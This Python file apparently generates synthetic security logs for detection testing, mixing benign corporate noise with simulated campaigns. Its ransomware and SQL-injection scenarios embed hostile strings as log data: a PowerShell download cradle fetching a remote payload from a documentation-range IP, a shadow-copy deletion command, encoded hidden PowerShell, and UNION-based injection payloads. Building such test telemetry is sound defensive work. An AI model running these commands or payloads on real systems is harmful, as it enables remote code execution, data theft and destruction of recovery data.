"""
Realistic Attack Scenarios & Ambient Security Telemetry Generator
Generates multi-stage adversary campaigns and background IT operational noise.
"""

import random
import uuid
from datetime import datetime, timezone
from typing import List, Dict, Any

AMBIENT_USERS = ["alice.carter", "bob.martinez", "charlie.kim", "system", "local_backup", "svc_monitoring"]
AMBIENT_HOSTS = ["WS-DEV-12", "WS-MKT-03", "SRV-FILE-01", "SRV-APP-02", "WS-HR-07"]
INTERNAL_SUBNET = "192.168.1."

def generate_ambient_log() -> Dict[str, Any]:
    """Generates a realistic benign log entry to simulate live corporate network traffic."""
    log_types = [
        {
            "source": "windows-security",
            "event_id": "4624",
            "severity": "INFO",
            "action": "LOGIN_SUCCESS",
            "user": random.choice(AMBIENT_USERS),
            "host": random.choice(AMBIENT_HOSTS),
            "source_ip": f"{INTERNAL_SUBNET}{random.randint(100, 240)}",
            "destination_ip": f"{INTERNAL_SUBNET}{random.randint(10, 50)}",
            "source_port": random.randint(49152, 65535),
            "destination_port": 445,
            "message": "An account was successfully logged on (Logon Type: 3 - Network)."
        },
        {
            "source": "nginx",
            "event_id": "HTTP_200",
            "severity": "INFO",
            "action": "HTTP_GET",
            "user": None,
            "host": "web-gateway-01",
            "source_ip": f"{random.randint(24, 210)}.{random.randint(10, 200)}.{random.randint(1, 250)}.{random.randint(1, 250)}",
            "destination_ip": "10.0.0.80",
            "source_port": random.randint(30000, 60000),
            "destination_port": 443,
            "message": "GET /api/v1/dashboard/metrics HTTP/1.1 - 200 OK (1420 bytes)"
        },
        {
            "source": "firewall",
            "event_id": "DNS_QUERY",
            "severity": "INFO",
            "action": "DNS_RESOLVE",
            "user": None,
            "host": "gateway-fw",
            "source_ip": f"{INTERNAL_SUBNET}{random.randint(100, 240)}",
            "destination_ip": "1.1.1.1",
            "source_port": random.randint(40000, 60000),
            "destination_port": 53,
            "message": "Standard DNS query A corporate.internal.cloud approved by policy."
        },
        {
            "source": "auth-linux",
            "event_id": "CRON_EXEC",
            "severity": "INFO",
            "action": "CRON_JOB",
            "user": "root",
            "host": "SRV-APP-02",
            "source_ip": "127.0.0.1",
            "destination_ip": "127.0.0.1",
            "source_port": None,
            "destination_port": None,
            "message": "CRON[14920]: (root) CMD (/usr/local/bin/backup_rotate.sh)"
        }
    ]

    selected = random.choice(log_types)
    return {
        "id": f"LOG-{uuid.uuid4().hex[:10].upper()}",
        "timestamp": datetime.now(timezone.utc),
        **selected
    }

def generate_brute_force_campaign() -> List[Dict[str, Any]]:
    """
    Scenario: External threat actor (185.220.101.42) runs password spray against Domain Controller,
    successfully breaches 'admin_sec', moves laterally to DC01, and executes encoded PowerShell.
    """
    attacker_ip = "185.220.101.42"
    target_host = "WS-ENG-09"
    dc_host = "CORP-DC01"
    logs = []

    # 1. 6 Failed authentication attempts (triggers T1110 alert)
    usernames = ["admin_sec", "admin_sec", "admin_sec", "admin_sec", "admin_sec", "admin_sec"]
    for u in usernames:
        logs.append({
            "id": f"LOG-{uuid.uuid4().hex[:10].upper()}",
            "timestamp": datetime.now(timezone.utc),
            "source": "windows-security",
            "event_id": "4625",
            "severity": "MEDIUM",
            "action": "LOGIN_FAILED",
            "user": u,
            "host": target_host,
            "source_ip": attacker_ip,
            "destination_ip": "192.168.1.45",
            "source_port": random.randint(50000, 60000),
            "destination_port": 3389,
            "message": f"An account failed to log on. Subject: {u}. Failure Reason: Unknown user name or bad password (0xC000006D)."
        })

    # 2. Account Compromise: Successful login (triggers R-02 Account Takeover)
    logs.append({
        "id": f"LOG-{uuid.uuid4().hex[:10].upper()}",
        "timestamp": datetime.now(timezone.utc),
        "source": "windows-security",
        "event_id": "4624",
        "severity": "HIGH",
        "action": "LOGIN_SUCCESS",
        "user": "admin_sec",
        "host": target_host,
        "source_ip": attacker_ip,
        "destination_ip": "192.168.1.45",
        "source_port": 54128,
        "destination_port": 3389,
        "message": "An account was successfully logged on. TargetUserName: admin_sec (Logon Type: 10 - RemoteInteractive/RDP)."
    })

    # 3. Lateral Movement: Pivot to DC01 (triggers T1021)
    logs.append({
        "id": f"LOG-{uuid.uuid4().hex[:10].upper()}",
        "timestamp": datetime.now(timezone.utc),
        "source": "windows-security",
        "event_id": "4648",
        "severity": "CRITICAL",
        "action": "REMOTE_SERVICE",
        "user": "admin_sec",
        "host": dc_host,
        "source_ip": "192.168.1.45",
        "destination_ip": "192.168.1.10",
        "source_port": 49210,
        "destination_port": 445,
        "message": f"A logon was attempted using explicit credentials. Target Server: {dc_host}. Source: 192.168.1.45."
    })

    # 4. Obfuscated PowerShell execution on Domain Controller (triggers T1059.001)
    logs.append({
        "id": f"LOG-{uuid.uuid4().hex[:10].upper()}",
        "timestamp": datetime.now(timezone.utc),
        "source": "windows-security",
        "event_id": "4688",
        "severity": "CRITICAL",
        "action": "EXEC_PROCESS",
        "user": "admin_sec",
        "host": dc_host,
        "source_ip": "192.168.1.45",
        "destination_ip": "192.168.1.10",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBiAHkAcABhAHMAcwA=",
        "message": "A new process has been created. Creator Process: explorer.exe. Process Name: powershell.exe with base64 encoded parameters."
    })

    return logs

def generate_web_sqli_campaign() -> List[Dict[str, Any]]:
    """
    Scenario: SQL Injection on customer web portal leading to exfiltration.
    """
    attacker_ip = "194.26.29.112"
    target_host = "PROD-WEB-FRONT"
    logs = []

    # 1. SQL Injection probes
    payloads = [
        "GET /api/users?id=1%20OR%201=1 HTTP/1.1",
        "POST /portal/login.php ' UNION SELECT username,password_hash FROM users--",
        "GET /search?q=test%27%20UNION%20SELECT%20null,table_name%20FROM%20information_schema.tables--"
    ]
    for p in payloads:
        logs.append({
            "id": f"LOG-{uuid.uuid4().hex[:10].upper()}",
            "timestamp": datetime.now(timezone.utc),
            "source": "nginx",
            "event_id": "WAF_ALERT",
            "severity": "HIGH",
            "action": "HTTP_REQUEST",
            "user": "anonymous",
            "host": target_host,
            "source_ip": attacker_ip,
            "destination_ip": "10.0.0.80",
            "source_port": random.randint(40000, 60000),
            "destination_port": 443,
            "message": f"WAF detection signature match [SQLi Injection Attempt]: {p}"
        })

    # 2. High volume outbound data exfiltration
    logs.append({
        "id": f"LOG-{uuid.uuid4().hex[:10].upper()}",
        "timestamp": datetime.now(timezone.utc),
        "source": "firewall",
        "event_id": "DATA_EXFIL",
        "severity": "CRITICAL",
        "action": "LARGE_OUTBOUND",
        "user": "www-data",
        "host": target_host,
        "source_ip": "10.0.0.80",
        "destination_ip": attacker_ip,
        "source_port": 443,
        "destination_port": 9001,
        "message": "Anomalous egress volume detected: 842.6 MB transferred over non-standard TLS port 9001 to external destination."
    })

    return logs

def generate_ransomware_campaign() -> List[Dict[str, Any]]:
    """
    Scenario: Ransomware precursor - encoded PowerShell, shadow copy deletion, mass file renaming.
    """
    host = "WS-FINANCE-04"
    user = "r.vance"
    logs = []

    # 1. Obfuscated PowerShell execution
    logs.append({
        "id": f"LOG-{uuid.uuid4().hex[:10].upper()}",
        "timestamp": datetime.now(timezone.utc),
        "source": "windows-security",
        "event_id": "4688",
        "severity": "HIGH",
        "action": "EXEC_PROCESS",
        "user": user,
        "host": host,
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.22/payload.ps1')",
        "message": "PowerShell invoked with execution bypass and download cradle string."
    })

    # 2. Vssadmin delete shadows (Ransomware signature)
    logs.append({
        "id": f"LOG-{uuid.uuid4().hex[:10].upper()}",
        "timestamp": datetime.now(timezone.utc),
        "source": "windows-security",
        "event_id": "4688",
        "severity": "CRITICAL",
        "action": "INHIBIT_RECOVERY",
        "user": user,
        "host": host,
        "process_name": "vssadmin.exe",
        "command_line": "vssadmin.exe delete shadows /all /quiet",
        "message": "Shadow copy destruction executed via vssadmin. System recovery inhibition indicator."
    })

    return logs

def generate_persistence_campaign() -> List[Dict[str, Any]]:
    """
    Scenario: Rogue Windows Service Installed for persistence.
    """
    host = "SRV-FILE-01"
    user = "local_admin"
    logs = []

    logs.append({
        "id": f"LOG-{uuid.uuid4().hex[:10].upper()}",
        "timestamp": datetime.now(timezone.utc),
        "source": "windows-security",
        "event_id": "7045",
        "severity": "HIGH",
        "action": "SERVICE_CREATED",
        "user": user,
        "host": host,
        "process_name": "svchost_updater.exe",
        "command_line": "C:\\Users\\Public\\svchost_updater.exe -k netsvc",
        "message": "A service was installed in the system. Service Name: WindowsSecurityUpdater. Service File Name: C:\\Users\\Public\\svchost_updater.exe"
    })

    return logs
